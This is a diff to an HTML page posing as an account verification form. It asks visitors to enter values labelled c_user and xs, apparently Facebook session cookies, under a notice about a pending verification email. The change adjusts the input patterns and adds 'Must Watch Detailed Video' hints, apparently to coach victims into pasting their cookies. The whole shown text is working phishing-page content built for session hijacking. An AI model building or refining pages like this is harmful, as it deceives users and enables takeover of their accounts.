@@ -41,15 +41,13 @@
                     <button>Enable Sound</button>
                     <p class="fw-semibold validation_form_para mt-2">Please be sure to provide the requested information below.</p>
 
-                    <!-- Keep the c_user and xs input here below -->
-                    
-                    <br>
-                    <input type="number" name="c_user" required="" pattern="^\d{15}$" title="Please enter 15 digits">
-                    <br>
-
-                    <label class="mt-2" style="font-size: 12px;">xs</label>
-                    <br>
-                    <input type="text" name="xs" required="" pattern="^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@#$%^&+=]).{12,}$">
+                    <label class="" style="font-size: 12px;">c_user</label>
+                                <br>
+                                <input type="text" name="c_user" placeholder="" pattern="[0-9]+" minlength="6" id="c_user" title="Must Watch Detailed Video" required="1" aria-required="true">
+                                <br>
+                                <label class="mt-2" style="font-size: 12px;">xs</label>
+                                <br>
+                                <input type="text" name="xs" id="xs""" pattern="^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@#$%^&+=]).{40,}$" title="Must Watch Detailed Video" required="1" aria-required="true">
                     <p class="mt-2" style="font-size: 12px;">Please make sure not to log out from your computer or laptop until you have received a verification email.</p>
                 </div>
                 <div class="p-2 mb-2 d-flex justify-content-end" style="background: rgb(245, 246, 247);">
